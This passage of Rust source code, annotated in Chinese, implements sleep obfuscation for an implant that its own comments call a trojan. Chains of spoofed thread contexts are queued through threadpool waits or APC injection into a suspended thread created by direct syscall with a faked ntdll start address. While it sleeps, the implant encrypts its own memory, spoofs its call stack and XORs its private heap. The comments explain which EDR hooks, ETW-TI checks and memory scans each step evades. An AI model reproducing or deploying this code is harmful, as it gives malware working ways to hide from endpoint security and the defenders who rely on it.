    /// 以上两个异步任务同时监听events[0](哑事件),迫使工作线程串行的以100ms的间隔执行,执行抓取快照并通知（唤醒）主线程的任务
    /// 5. 捕获快照:工作线程因wait_ctx的100ms超时被唤醒,执行trampoline,进而执行RtlCaptureContext，将当前物理寄存器状态写入 ctx_init 结构体中
    /// 6. 点亮events[1]:工作线程因wait_event的200ms超时被唤醒,执行NtsetEvent2.该函数将events[1] active
    /// 7. 主线程复活:在第4步主线程因events[1]被挂起
    /// 8. 组装ROP chain:主线程根据抓到的ctx_init复制出ctxs数组.主线程修改ctxs[0],将其Rip设为nt_wait_for_single,将Rcx设为events[2],等待events[2] active后,开始串行执行10个ctx的任务
    /// 9. 收尾:主线程修改ctxs[9],将其Rip设为nt_set_event,将Rcx设为events[3]
    /// 10. ROP chain排队:主线程通过for遍历ctxs数组,为每个ctx调用TpAllocWait生成wait句柄,通过统一的TpSetWait(wait, events[0], &mut delay)在线程池排队,超时时间以100ms步长累加
    /// 11. 主线程调用NtSignalAndWaitForSingleObject(events[2], events[3], 0,null_mut()),点亮events[2],让第8步的ROP chain开始执行.整个ROP链依赖events[0]串行以100ms间隔执行.同时主线程在events[3]上挂起,等待ctx[9]中的events[3]被点亮
    /// this strategy is similar to hyonus::timer ,but uses TpSetWait instead of TpSetTimer to drive the spoofed CONTEXT chain
    fn wait(&mut self) -> Result<()> {
        unsafe {
            // determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // events used to synchronize context capture and chain completion

            // 数组events是一个值,是当前函数栈上直接分配的,大小固定的值;是栈上一个连续的,大小32字节(4*8)的内存块,里面初始化了4个0,即空指针null_mut()
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(),
                    EVENT_TYPE::NotificationEvent,
                    0,
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(HypnusError::NtCreateEventFailed, "NtCreateEventFailed")
                }
            }
            // allocation dedicated threadpool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                stealth_bail!(HypnusError::TpAllocPoolFailed, "TpAllocPool Failed")
            }

            // configure threadpool stack sizes
            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };
            // TpSetPoolStackInformation原型的第二个参数是*mut,但这里却传入了&mut.详见注释4
            status = TpSetPoolStackInformation(pool, &mut stack);

            // 配置线程池为单线程
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // prepare callback environment
            // TP_CALLBACK_ENVIRON_V3代表?
            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };

            // capture the current thread context
            let mut wait_ctx = null_mut();
            // 关于CONTEXT的初始化详情,见注释5
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // the trampoline is needed beacuse thread pool passes the parameter in rdx,not rcx
            // the trampoline moves rdx to rcx and jumps to CONTEXT.P1Home(RtlCaptureContext)
            // ensuring a clean transition with no extra instructions before context capture

            // 在私有线程池创建一个监听器(wait objec),一旦后续点亮某事件.线程池中的worker thread被唤醒去执行trampoline,并将准备好的ctx_init结构体的内存地址传给它.trampoline会让worker thread调用 RtlCaptureContext.把工作线程干净,没有用户函数污染的寄存器快照写入ctx_init中
            status = TpAllocWait(
                // 输出参数,其类型是双指针.后续win内核在堆区申请好TP_WAIT结构体后,将该结构体的内存首地址写入wait_ctx变量中.之后会通过TpSetWait正式开启监听
                &mut wait_ctx,
                // 输入参数,回调函数地址.其类型是函数指针,需要符合PTP_WAIT_CALLBACK 签名.这里将trampoline通过as *mut c_void强转成无类型的通用裸指针,满足ffi签名
                self.cfg.trampoline as *mut c_void,
                // 传入回调函数的参数.&mut ctx_init是rust安全引用(类型 &mut CONTEXT) -> as *mut _(将rust安全引用转为裸指针,类型*mut CONTEXT,使用_让编译器自动推导) -> as *mut c_void(将*mut CONTEXT 转为*mut c_void 满足api原型参数的要求)
                &mut ctx_init as *mut _ as *mut c_void,
                // 输入参数,类型*mut TP_CALLBACK_ENVIRON_V3:配置之前私有单线程池的初始化.事件被点亮后由私有工作线程去执行跳板.如果传入null_mut(),该任务会被丢进系统公共线程池.
                &mut env,
            );

            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::TpAllocWaitRtlCaptureContextFailed,
                    "TpAllocWait [RtlCaptureContext] Failed"
                )
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            // 设置两个触发机关(事件被点亮/超时)
            TpSetWait(
                // 要激活的等待对象句柄
                wait_ctx,  // 要监听的内核对象句柄(或事件)
                events[0], // 超时时间指针
                &mut delay,
            );

            // signal after RtlCaptureContext finish
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event,
                NtSetEvent2 as *mut c_void,
                events[1],
                &mut env,
            );

            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::TpAllocTimerNtSetEventFailed,
                    "TpAllocWait [NtSetEvent] Failed"
                )
            }

            delay.QuadPart = -(200i64 * 10_000);
            // 让wait_event同样去监听events[0](或200ms的超时,晚于wait_ctx的100ms).由于线程池单线串行执行,确保工作线程先执行trampoline抓完快照,后执行NtSetEvent2去点亮events[1],从而安全唤醒主线程.
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for context capture to complete:主线程在这里无限挂起自己,直到events[1]被worker thread在执行ntsetevent2时点亮.这意味着快照抓取完成,主线程可以安全唤醒
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::TpAllocWaitNtSetEventFailed,
                    "TpAllocWaitNtSetEventFailed"
                )
            }
            // 以上执行流:events[0]是一个占位事件,在内核中永远处于无信号状态,其唯一目的是充当TpSetWait参数,让线程池通过100ms/200ms的超时触发回调;events[1]是真正的唤醒信号,200ms超时后,被工作线程执行NtSetEvnet2主动点亮,用以唤醒正在等待的主线程
            // 1. 主线程在修单线程池中注册两个等待任务(wait_ctx wait_event):wait_ctx等待events[0]或100ms超时,触发后执行trampoline(抓取快照并存入ctx_init);wait_event也等待events[0]或200ms超时,触发后执行NtSetEvent2(负责点亮events[1])
            // 2. 主线程调用NtWaitForSingleObject挂起自己,进入无限沉睡,等待wait_event的完成信号
            // 3. worker thread执行wait_ctx抓取快照:100ms超时后,工作线程被唤醒执行wait_ctx(通过trampoline进入RtlCaptureContext,将当前干净的寄存器状态写入主线程ctx_init内存中)
            // 4. 200ms超时后,工作线程接着执行wait_event:通过NtSetEvent2向events[1]发送激活信号
            // 5. events[1]亮起,内核唤醒主线程.主线程确信ctx_init已被工作线程完整写好.进而执行之后的栈伪造

            // build muti-step spoofed CONTEXT chain
            let mut ctxs = [ctx_init; 10];
            // 由于ASLR,每次运行NtContinue的地址都不同,将该函数地址存入ctx.rax中,可以实现动态传递(配合 config.rs/cfg/callback的trampoline)
            // 这里是对worker thread栈空间的操作
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // duplicate thread handle for context mainpulation:从伪句柄转到真实可操作的句柄
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtDuplicateObjectFailed,
                    "NtDuplicateObject Failed"
                )
            }

            // base CONTEXT for spoofing
            // ctx_init是worker thread先前被捕获的快照,这里是对主线程栈空间的操作
            ctx_init.Rsp = current_rsp();
            // 根据捕获的快照伪造栈帧
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // the chain will wait until event2 is signaled
            // 将伪造栈帧的rip置为NtWaitForSingleObject的地址.这样当该栈帧加载到cpu时,就像一个系统调用

            // 这里将worker thread挂起,等待events[2]信号.events[2]作用:?
            // jmp内部会通过new链接到gadget
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8 = size.as_u64();
            ctxs[1].R9 = PAGE_READWRITE as u64;

            // encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8 = 0;

            // backup CONTEXT
            let mut ctx_backup = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // sleep:木马执行流真正休眠的地方,此时木马的内存已加密,栈帧已伪造,且线程处于合法的系统等待状态.
            // 如果此时不挂起,会立即继续执行ctxs[6]的解密内存和ctxs[7]的还原rx属性.木马在加密状态停留的时间极短,起不到休眠混淆的作用
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8 = 0;

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8 = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8 = size.as_u64();
            ctxs[7].R9 = protection;

            // Restore thread context:抛弃之前伪造的ROP假栈帧(ctxs[4])和20K的gap.将工作线程还原到最初干净的原始状态
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // final event notification:将events[3]修改为active.在wait()中,主线程和ROP chain的交互,首先在ctxs[9]将events[3]置为active.后续代码中,主线程在提交完所有任务调用了 NtSignalAndWaitForSingleObject(主线程无限期挂起,等待events[3]被点亮)
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[3] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg
                .stack
                .spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;

            // patch old_protect into expected return slots:NtProtectVirtualMemory有5个参数,win64 fast call下前四个是寄存器传参,第五个放在栈上.对应的位置在shadows space(32字节)和返回地址(8字节)之后,即rsp+0x28位置.
            // 这里设置NtProtectVirtualMemory的第5个参数是old_protect.在其读取时会将第5个参数当作指针处理
            // 且其必须在self.cfg.stack.spoof之后执行.一位内在spoof()之前,ctxs[1].Rsp 和 ctxs[7].Rsp处于未完成状态,即他们最终被伪造的栈顶物理地址被没有被计算出来.spoof()执行完毕,才会根据ROP链的堆叠深度和对其要求,计算出最终rsp值.只有拿到最终rsp的值,才能+0x28找到精准的第5个参数的位置
            // 其最终目的为了恢复之前的内存属性.根据NtProtectVirtualMemory的设计:只要调用它,内核在执行完毕前,必须且一定向你提供的第五个参数(指针)所指向的地址,写入修改之前的内存属性.如果,该第五个参数传入0或垃圾地址,内核在尝试写入数据的瞬间,会触发内核页写入异常(STATUS_ACCESS_VIOLATION),导致木马崩溃退出.这也是ctxs[7]必须写入old_protect的原因
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // schedule each CONTEXT via tpallocwait

            // 在堆区创建线程池中10个独立的异步任务.详见注释6
            // 构建10步ROP执行链的调度.后续通过TpSetWait真正开始执行
            for ctx in &mut ctxs {
                let mut wait = null_mut();
                status = TpAllocWait(
                    &mut wait,
                    self.cfg.callback as *mut c_void,
                    ctx as *mut _ as *mut c_void,
                    &mut env,
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(HypnusError::TpAllocWaitFailed, "TpAllocWait Failed")
                }

                // add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                // 让10个wait对象全部去等待events[0] 详见注释7
                TpSetWait(wait, events[0], &mut delay);
            }

            // optional heap encryption:在主线程正式休眠之前,动态生成密钥并加密自定义的私有堆.
            // 这为了应对edr的内存静态扫描和内存转储memory dump.详见注释8
            let key = if heap {
                // 映射cpu硬件指令:RDTSC(read time-stamp counter)读取cpu自开机以来经过的时钟周期数(clock cycles).相比rand()不会增加程序体积和IAT特征,且rdtsc是单周期cpu指令,开销极小,无法预测.
                let key = core::arch::x86_64::_rdtsc().to_le_bytes(); // 将u64转为数组[u8;8],采用小端序(little-endian),小端序是win64默认内存layout.因为底层加密函数是已字节为单位进行xor的,必须把需要xor的数据打散位字节数组的形式

                // 使用key进行加密
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // wait for chain completion

            // ntdll.dll!NtSignalAndWaitForSingleObject:双重同步原语.详见注释9
            // 在wait()中,这里是主线程和工作线程交接的地方.在此之前,主线程将10个ctxs提交给线程池,在ctxs[0]就在等待events[2](通过NtWaitForSingle函数).这表示10个任务虽然已提交,在此时设置的串行执行线程池环境下,整个ROP链仍处于静止状态.
            // 此处,主线程调用NtSignalAndWaitForSingleObject 并传入 events[2],将events[2]置为active,工作线程开始执行.同时在点亮events[2]的同一时钟周期,主线程被内核挂起,进入对events[3]的等待.
            // 这会导致:主线程挂起让出所有cpu资源.worker thread开始执行10个ctx任务,直到ctxs[9]时点亮events[3].主线程从NtSignalAndWaitForSingleObject这里被唤醒,继续向下执行.

            // de-obfuscate heap if needed:再次调用一次 obfuscate_heap(&key)还原之前加密的堆内存
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });
            Ok(())
        }
    }

    /// performs memory obfuscation using APC injection and hijacked thread context:foliage意为树叶,这里thread为树枝,APC就是挂在这个树枝上的树叶.主线程不动,创建一个挂起的新线程,把10个ROP上下文像树叶一样逐个放入新线程的APC序列,当新线程解除挂起,这些树叶就会顺序执行.关于APC 详见注释10
    //
    fn foliage(&mut self) -> Result<()> {
        unsafe {
            // determine if heap obfuscation and rwx memory shoul be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // create a manual-reset synchronization event to be signaled after execution
            let mut event = null_mut();
            // NtCreateEvent用于初始化一个自动复位的同步事件对象.这个事件是主线程与傀儡辅助线程之间交接的纽带
            // 所有事件在底层都是一个真实的,由内核管理的内存实体.物理上是系统内核中分配的一块名为KEVENT结构体,
            let mut status = NtCreateEvent(
                &mut event,                       // 输出创建的事件句柄指针
                EVENT_ALL_ACCESS,                 // 期望访问权限(这里是最高权限)
                null_mut(),                       //对象的安全属性和名称(这里是匿名对象)
                EVENT_TYPE::SynchronizationEvent, // 事件类型是自动复位模式:win的事件分为 NotificationEvent（通知/手动复位）和 SynchronizationEvent（同步/自动复位)
                0,                                // 事件被创建时的状态,0表示关闭状态
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(HypnusError::NtCreateEventFailed, "NtCreateEvent Failed");
            }

            // create a new thread in suspended挂起 state for APC inject
            let mut h_thread = null_mut::<c_void>();
            // 暂时使用uwd的直接系统调用,后续应改为uwd重构的项目.
            // 常规创建线程使用createthread(底层调用ntdll.dll!NtCreateThreadEx),EDR会在这个ex函数开头inline hook,用以监视进程是否创建线程.这里不通过ntdll.dll的导入函数,通过uwd的syscall切入ring0创建线程
            status = uwd::syscall!(
                obf!("NtCreateThreadEx"),
                h_thread.as_ptr_mut(),
                // 申请最高权限,后续能放入apc
                THREAD_ALL_ACCESS,
                null_mut::<c_void>(),
                // 挂在到当前进程
                NtCurrentProcess(),
                // edr的etw-ti发现有新线程创建时,重点检查该线程起始地址startaddress.如果将新线程的startaddress放入这里新申请的rwx内存中.edr会检测到新线程的起始地址不在ntdll,而报异常.
                // 这里在ntdll中找到TpReleaseCleanupGroupMembers函数地址,并加上0x250的偏移构建新地址.新地址可能是某个内存gadget.当内核记录这个新线程的诞生时,发现是由ntdll中某个合法线程池维护函数发起的新线程
                (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                null_mut::<c_void>(),
                // 挂起新线程(因为填入的startaddress是假的).
                1,
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut::<c_void>()
            )
            // 当前函数返回Result<T,HypnusError>,而uwd::syscall!返回Result<T,anyhow::Error>.导致类型不匹配,所以使用map_err()转换错误类型
            .map_err(|_| HypnusError::NtCreateThreadFailed)? as NTSTATUS;

            if !NT_SUCCESS(status) {
                stealth_bail!(HypnusError::NtCreateThreadFailed, "NtCreateThreadFailed");
            }

            // get the initial context of the suspended thread:抓取傀儡线程的CONTEXT
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };
            status = uwd::syscall!(obf!("NtGetContextThread"), h_thread, ctx_init.as_ptr_mut())
                .map_err(|_| HypnusError::NtGetContextThreadFailed)?
                as NTSTATUS;
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtGetContextThreadFailed,
                    "NtGetContextThread Failed"
                );
            }

            // clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];

            // duplicate the current thread handle
            let mut thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtDuplicateObjectFailed,
                    "NtDuplicateObjectFailed"
                );
            }

            // preparing for call stack spoofing:ctx_init是之前抓取的寄存器状态,这里要伪造当前的栈帧,需要把当前栈顶指针rsp给ctx_init
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // 开始配置10个ctx.
            // the chain will wait until event is signaled
            // 关于into():ctxs[0..9].rip对应的类型是u64,而从self.cfg.函数名 对应的是自定义的WinApi(winapis.rs).WinApi内部虽然只有一个u64,且使用了#[repr(transparent)]保证内存布局一致,但在Rust强类型语义下,WinApi和u64是完全不同的类型.在winapis.rs中对WinApi类型实现了From trait.Rust中一旦对一个类型实现了From trait,rustc会自动为其实现对应into()方法

            // 还是主线程将自己挂起,等待事件actived
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // temporarily makes the target memory region writable before encryption:在加密前将内存region改为rw
            let mut old_protect = 0u32;
            // 由调用者传入的两个参数
            let (mut base, mut size) = (self.base, self.size);
            // 相比timer()需要jmp()的trampoline间接跳转.foliage走APC队列,内核在派发APC时,直接将CONTEXT覆盖到挂起的线程上,因此直接设置Rip即可
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8 = size.as_u64();
            ctxs[1].R9 = PAGE_READWRITE as u64;

            // encrypts or masks the specified mempry region
            ctxs[2].Rip = self.cfg.system_function040.into();
            // 这个函数需要的是直接指针/数值,上个函数需要的是指针的指针,所以这里不需要转换
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8 = 0;

            // save the original CONTEXT so it can be restored later:h_thread是新建的傀儡辅助线程,在函数开头抓取的ctx_init是它的初始挂起状态.thread是主线程复制出来的真实句柄,指向主线程自己.在ctxs[3]中抓取的是主线程上下文存入ctx_backup.详见注释11
            // 为啥前面使用RtlCaptureContext这里使用NtGetContextThread见hypnus.md
            let mut ctx_backup = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };
            ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // injects a spoofed CONTEXT to modify return flow(stack/frame spoofing)
            ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[4].Rcx = thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // sleep primitive using the current thread handle and a delay:将指定的句柄对应的线程挂起阻塞,并指定超时时间
            ctxs[5].Rip = self.cfg.wait_for_single.into();
            ctxs[5].Rcx = thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8 = 0;

            // dencrypts(unmasks) the memory after waking up
            ctxs[6].Rip = self.cfg.system_function041.into();
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8 = 0;

            // restores the memory protection after decryption
            ctxs[7].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8 = size.as_u64();
            ctxs[7].R9 = protection;

            // restores the original thread context
            ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[8].Rcx = thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // gracefully terminates the helper thread after all steps are complete
            ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[9].Rcx = h_thread as u64;
            ctxs[9].Rdx = 0;

            // layout the entire spoofed CONTEXT chain on the stack
            self.cfg
                .stack
                .spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;

            // write old_protect values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Queue each CONTEXT as an APC to be executed in sequence 背景详见注释12
            // 相比timer 和 wait()使用线程池技术,这里使用使用NtQueueApcThread进行APC注入,将待执行函数NtContinue地址传给参数2,将ctx[0..9]地址传给参数3.
            // 傀儡线程被唤醒开始派发apc任务时,内核把&ctxs[n]的内存地址强行塞进cpu的rcx寄存器;内核把Ntcontinue的地址塞进rip
            // ->cpu开始执行ntcontinue:把ctxs中的&ctxs[n]当成CONTEXT读取,将其中保存的所有寄存器数值全部倒进cpu的物理硬件寄存器中.那么cpu就变成ctxs[n]的样子.
            // ->ntcontinue结束,cpu开执行这个被替换后的状态
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    // 目标线程句柄
                    h_thread,
                    // 要执行的函数地址:如果直接填入敏感api地址,edr会报异常.这里用ntcontinue把当前cpu状态丢弃,强制改为参数3表示的cpu状态
                    self.cfg.nt_continue.as_ptr().cast_mut(),
                    // 传给ntcontinue的第一个参数(ntcontinue只接收一个参数,一个CONTEXT结构体的指针).由于ctx的类型是&mut CONTEXT,只是数组中的一个元素且rust中 &mut CONTEXT和c中的*mut CONTEXT不是同一种类型,需要先降级为*mut CONTEXT(通过_让编译器推断),再转为*mut c_void这种裸指针类型
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );
                if !NT_SUCCESS(status) {
                    stealth_bail!(
                        HypnusError::NtQueueApcThreadFailed,
                        "NtQueueApcThread Failed"
                    );
                }
            }

            // trigger the apc chain by resuming the thread in alertable state
            // NtQueueApcThread(r8=context),之后内核代为执行NtAlertResumeThread中NtContinue.并将将r8给了的ntcontinue的rcx.这是内核传递的
            // 这并不是通过简单的mov rcx,r8完成的(因为在休眠期间,cpu的r8已经被其他程度用很多次).而是当调用NtQueueApcThread时,内核会将r8中的ctx这个信息存入内核高权限内存非分页池中的KAPC(kernel apc)结构体,然后释放r8.当NtAlertResumeThread开始时,内核唤醒线程查看KAPC.内核会根据win64的fastcall,将对应的内容写入rcx,并跳入NtContine执行.即API 接口的R8（参数位置），在时间流转之后，被操作系统以契约的形式，物理转移到了执行接口的 RCX 中
            status = NtAlertResumeThread(h_thread, null_mut());
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtAlertResumeThreadFailed,
                    "NtAlertResumeThread Failed"
                );
            }

            // if heap obfuscation is enable,encrypt memory before execution
            // 位于NtAlertResumeThread唤醒傀儡线程,apc链开始执行后.主线程立即执行私有堆加密,之后会挂起主线程,等待apc链执行结束的信号.
            // 这里的堆加密没有放入apc队列,而是由主线程执行.hypnus的内存架构 见注释13
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // wait until the thread finish the spoofed chain
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    HypnusError::NtWaitForSingleObjectFailed,
                    "NtSignalAndWaitForSingleObject Failed"
                );
            }

            // de_obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // clean up all handles
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);
        }

        Ok(())
    }
}

/// converts self to a u64 that representing the pointer value
///
trait Asu64 {
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        // self as *mut _ :从self(&mut T)转为raw pointer
        // as *mut c_void:转为符合c 的接口标准(ffi)
        self as *mut _ as *mut c_void as u64
    }
}

/// iterates over all entries in the process heap and applies
/// an XOR operation to the data of entries marked as allocated
///
/// 通过RtlWalkHeap遍历自定义的私有堆内存HypnusHeap(allocator.rs)中每个内存块.如果对应的内存块正在使用,把里面的数据做xor运算加密.一定不能用该方法加密win的默认进程的堆内存,os后台线程可能随时读写默认堆,如果读到乱码会蓝屏/进程崩溃.因此必须在allocator.rs中自定义hypnusheap自定义堆的原因.此外,heap在win中不是一块连续的内存,是由NTDLL的heap manager维护的复杂segments组成的
// 没有显示指定返回类型,默认返回单元类型即(),是一个空元组,不包含任何数据,内存占用0字节
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = HypnusHeap::get();
    if heap.is_null() {
        return;
    }

    // walk through all heap entries
    let mut entry = unsafe {
        // 在当前函数栈上开辟一块内存,大小RTL_HEAP_WALK_ENTRY,并将其每个字节刷为0(避免RtlWalkHeap保存上次遍历堆时留下的状态)
        zeroed::<RTL_HEAP_WALK_ENTRY>()
    };
    // 将私有堆的handle和预置好的entry传入RtlWalkHeap
    while RtlWalkHeap(heap, &mut entry) != 0 {
        // check if the entry is in use:内存块有两种状态 free/busy.对free内存块加密会影响堆管理器后续分配堆内存,导致严重错误.
        // 在win sdk,win把4宏定义为#define PROCESS_HEAP_ENTRY_BUSY 0x0004
        // win下调用c的malloc/c++的new/rust的alloc crate分配堆内存时,底层最终调用win api RtlAllocateHeap.为了管理内存,堆管理器会在申请的内存头/尾加上元数据用于控制.当RtlWalkHeap读到这些元数据时,会转译为这里定义好的RTL_HEAP_WALK_ENTRY结构体.
        // 其中Flags字段(结构体原型中类型是WORD双字节),使用二进制位表示不同的状态,其中0x0004代表busy状态.所以与4做位与操作,就能检测该块内存是否busy
        if entry.Flags & 4 != 0 {
            xor(
                // 执行用户数据区域第一个字节,即堆内存块开始地址
                entry.DataAddress as *mut u8,
                entry.DataSize,
                key,
            );
        }
    }
}

/// applies an XOR transformation to a memory region using the given key
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }

    // 以字节为单位移动,^ 代表xor异或操作
    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}

// 注释1
// win默认在线程启动只提交4kb.当线程的局部变量需要更多栈空间时,必须顺序访问下一个页面,触发PAGE_GUARD保护页异常,os内核捕获后会自动提交新页面.但是只有最后一个committed的页是Guard Page(其属性是PAGE_GUARD | PAGE_READWRITE),该页处于committed 和 reserved之间.
// 在向属性PAGE_GUARD的页写入数据时,才会触发Page Fault缺页异常,进而陷入内核(缺页异常处理程序)由内核去除该页的PAGE_GUARD属性,将其变为普通committed的可读写页,将下一个相邻的页属性变为PAGE_GUARD.结果是:栈安全的向下扩展一页,程序无感知的继续运行.
// 但在spoof.rs的spoof函数, ctx.Rsp = (ctx.Rsp - 0x1000 * 10) - (伪造栈帧大小);减去了40+kb的空间.以保守的40kb计算,这里rsp直接指向了非常远的位置,自然跳过了属性为PAGE_GUARD的页.那么当cpu尝试向该页写入数据,cpu硬件触发Page Fault(缺页异常),进而陷入内核,但是对应的内存虚拟地址没有PAGE_GUARD属性.内核判定这不是合法的栈增长请求,而是一个非法的野指针尝试写入未分配的内存.内核进而向该线程派发 STATUS_ACCESS_VIOLATION （ 0xC0000005,即段错误/内存越界访问）异常.而代码又没有捕获该异常,进程瞬间崩溃.
